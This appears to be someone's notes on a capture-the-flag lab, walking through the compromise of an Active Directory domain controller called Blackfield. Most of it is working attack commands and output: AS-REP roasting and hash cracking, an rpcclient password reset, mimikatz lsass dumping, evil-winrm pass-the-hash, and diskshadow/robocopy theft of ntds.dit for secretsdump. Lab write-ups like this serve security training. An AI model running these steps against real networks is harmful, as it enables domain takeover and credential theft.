#########
Anonymous / Guest access to an SMB 
Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack.
Retrieve a hash of the encrypted material contained in the AS-REP
Offline brute force attack in order to recover the plaintext password
SMB share containing forensics artefacts, including an lsass process dump.
WinRM privileges
Dmp the Active Directory database
Retrieve the hash of the primary domain administrator. 
Robocopy + diskshadow - Dump Backup
NTDIS == DB to store AD data
#########
BlackFIled:

1-Enumeration:
    nmap -T5 -sV -sC -Pn 10.10.10.192  -oN enum/scan.log -vv
    PORT     STATE SERVICE       REASON  VERSION
    88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-22 23:57:12Z)
    135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
    389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
    593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0



SMB/LDAP:
    Enumerate LDAP:
        nmap -n -Pn -sV --script "ldap* and not brute" -p 389 10.10.10.192

        rootDomainNamingContext: DC=BLACKFIELD,DC=local
        ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL
        namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local 
        dnsHostName: DC01.BLACKFIELD.local

 
    Try RPC connection:
    rpcclient -U "" -N 10.10.10.192


    enum4linux -a -u "" -p "" 10.10.10.192
    Domain Name: BLACKFIELD
    Domain Sid: S-1-5-21-4194615774-2175524697-3563712290


    Enumeration DNS:
        nmap -Pn -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" 10.10.10.192


    Enumerate SMB:
        crackmapexec smb 10.10.10.192 -u "" -p "" --shares
            SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
            SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\:
            SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

    
    smbclient -L //10.10.10.192/
        Password for [WORKGROUP\dsk75]:
                Sharename       Type      Comment
                ---------       ----      -------
                ADMIN$          Disk      Remote Admin
                C$              Disk      Default share
                forensic        Disk      Forensic / Audit share.
                IPC$            IPC       Remote IPC
                NETLOGON        Disk      Logon server share
                profiles$       Disk     
                SYSVOL          Disk      Logon server share


    We get access:
        smbclient //10.10.10.192/profiles$
        We find usernames in the profile$ we will use it for Kerbrute 

    Kerbrute find users account without "Pre auth"
        kerbrute -domain blackfield.local -users users.txt -passwords passwd.txt -outputfile ldapEnum.log 

    We found 3 users  and 1 without Preauth:
        audit2020
        support  <----------- NOT PRAUTH 
        svc_backup



    NOT Pre-Auth Kerberos - ASREPRoast:
        We will try to obtain a TGT Ticket via the support form our Enumeration - Because it seems that support do not require PREAUTH:

            python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.192 blackfield.local/support -no-pass

        [*] Getting TGT for support
        
        We past all the TGT Hash in a file to hashcat (ASREPRoast):
            hashcat hash.hash /usr/share/wordlists/rockyou.txt -m 18200

        We found the password for support 


    We will test Enumeration Via rpcclient:
        rpcclient -U "support" 10.10.10.192      
            Password for [WORKGROUP\support]:
            rpcclient $> enumdomusers
                ....
                user:[audit2020] rid:[0x44f]
                user:[support] rid:[0x450]
                user:[svc_backup] rid:[0x585]
                user:[lydericlefebvre] rid:[0x586]

            rpcclient $> enumdomgroups
                group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
                ....
                group:[DnsUpdateProxy] rid:[0x44e]
            rpcclient $> 

    We have access to SYSVOL on the SMB:
        smbclient //10.10.10.192/SYSVOL -U'blackfield.local\support'

*******************************************************************************
        We Upload everything we can:
            smb: \> mask ""
            smb: \> recurse
            smb: \> prompt
            smb: \> mget *
        We found Nothing special ......

        We will try to modify other users password via rpcclient:
            rpcclient $> setuserinfo2 audit2020 23 '#00^BlackKnight'

        It seems to work
*******************************************************************************

    Now we have access to the "forensic" SMB:
        smbclient //10.10.10.192/forensic -U'blackfield.local\audit2020'
            Password for [BLACKFIELD.LOCAL\audit2020]:
        
        We upload a lot of files - need to check into these....

        We find a pretty interesting 'lsass.zip' heheehe

        We will Unzip the file and we need a Windows Box to open the DUMP file via mimikatz
            lssas.DMP 

        In the right File PAth:
            sekurlsa::minidump lsass.DMP 
            sekurlsa::logonpasswords full 

    We found the svc_backup NTLM Hash 


2-Exploit:
    $ evil-winrm -i 10.10.10.192 -u svc_backup  -H '9658d1d1dcd9250115e2205d9f48400d'

    Windows svc_backup Enum:
        whoami /priv

            RIVILEGES INFORMATION
            ----------------------
            Privilege Name                Description                    State
            ============================= ============================== =======
            SeMachineAccountPrivilege     Add workstations to domain     Enabled
            SeBackupPrivilege             Back up files and directories  Enabled  <---------- Robocopy copy file PRIV ESC ?
            SeRestorePrivilege            Restore files and directories  Enabled  <----------Both for Robocopy
            SeShutdownPrivilege           Shut down the system           Enabled  
            SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
            SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

        we are a member of the Backup Operators group, we are authorized to create system backups

        We will use the 'robocopy /B' that allow to COPY FILE in BACKUP MODE
            In order to get access to some files usually unaccessible
            -https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

####################################################################################################################################
        Robocopy Priv Esc:
            1st copy some files:
                robocopy C:\users\administrator\desktop\ C:\temp /B

                we  found this note:
                    "Mates,

                    After the domain compromise and computer forensic last week, auditors advised us to:
                    - change every passwords -- Done.
                    - change krbtgt password twice -- Done.
                    - disable auditor's account (audit2020) -- KO.
                    - use nominative domain admin accounts instead of this one -- KO.

                    We will probably have to backup & restore things later.
                    - Mike.

                    PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)"

            
            
            We will use this to our advantage by creating a backup that includes the NTDS.dit file, 
            from which we can extract the hashes for later use to escalate our privileges:

                -https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

                
            Diskshadow creates copies of a currently used drive, while Robocopy copies files and directories from one location to another.

                We cannot copy the system files directly using regular copy commands because they are always running and in use.

            To create the live copy, we run a script that performs a full backup of the C: drive and exposes it as Windows\Temp

                On kali we create a Disk2.txt with the script

            After putting together the script, we pass it to the Diskshadow utility to create the shadow copy that will create a snapshot of the drive while the files are in use:
                We got to Windows\Temp:
                    We'll use "upload" because the 'certutil' cmd is bloked by Defender:
                        upload disk2txt

            We check if it's OK:

                *Evil-WinRM* PS C:\Windows\Temp> diskshadow /s disk2.txt
                    Microsoft DiskShadow version 1.0
                    Copyright (C) 2013 Microsoft Corporation
                    On computer:  DC01,  2/25/2024 4:37:50 PM

                    -> set context persistent nowriter

                    SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }

                            CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
                            PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
                            PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
                            VOLATILE                Specify that shadow copy will be deleted on exit or reset.
                            VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.

                            Example: SET CONTEXT CLIENTACCESSIBLE

            It indicate an error with a (s) missing a 'nowriters' we need to add 'spaces' in our script to avoid some code parsing bugs

            We re upload the new script and re run - it seems to work:

                *Evil-WinRM* PS C:\Windows\Temp\parity> upload disk2.txt
                                        
                    Info: Uploading /home/kali/disk2.txt to C:\Windows\Temp\parity\disk2.txt
                                                            
                    Data: 272 bytes of 272 bytes copied
                                                            
                    Info: Upload successful!


                *Evil-WinRM* PS C:\Windows\Temp\parity> diskshadow /s disk2.txt
                    Microsoft DiskShadow version 1.0
                    Copyright (C) 2013 Microsoft Corporation
                    On computer:  DC01,  2/25/2024 4:45:03 PM

                    -> set context persistent nowriters
                    -> add volume c: alias parity
                    -> create
                    Alias parity for shadow ID {1d71a64d-ff5e-46c0-ab56-f5f7bcf7b6cd} set as environment variable.
                    Alias VSS_SHADOW_SET for shadow set ID {e67d2705-7cb5-463a-bf1d-9c4e51d04642} set as environment variable.

                    Querying all shadow copies with the shadow copy set ID {e67d2705-7cb5-463a-bf1d-9c4e51d04642}

                            * Shadow copy ID = {1d71a64d-ff5e-46c0-ab56-f5f7bcf7b6cd}               %parity%
                                    - Shadow copy set: {e67d2705-7cb5-463a-bf1d-9c4e51d04642}       %VSS_SHADOW_SET%
                                    - Original count of shadow copies = 1
                                    .......
                                    .......
                                    The script file name is not valid. <---------------- WE Notice this error because we don't have the 'Permission' to copy

                                    EXEC <file.cmd>
                                            Execute a script file on the local machine.
                                            This command is used to duplicate or restore data as part of
                                            a backup or restore sequence.
                *Evil-WinRM* PS C:\Windows\Temp\parity> 

            
            To bypass the copy permission 'Denied' we will use robocopy /B instead of copy:
                robocopy z:\windows\ntds\ c:\Windows\Temp\parity\ ntds.dit /B
####################################################################################################################################

            IT WORKS !!!!
                Via evil win rm:
                    reg.exe save hklm\system c:\Windows\Temp\parity\system.bak

                    download ntds.dit
                    download system.bak

            We go back to our Kali and check if ntdis and system are well uploaded

            We'll user "secretsdump.py" to dump ntdis + system.bak in LOCAL machine:

                └─$ /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.bak -ntds ntds.dit LOCAL 

            NOW we have the Administrator NTLM hash that we'll use to perform PTH via evil win rm:

                We use the laste part of the NTLM Hash:
                    evil-winrm -i 10.10.10.192 -u administrator  -H '184fb5e5178480be64824d4cd53b99ee'

            We can also use lsassy.py to get a clear password:
                -d blackfield -u administrator -H 184fb5e5178480be64824d4cd53b99ee blackfield -m 0



                




 

 

 

 



 

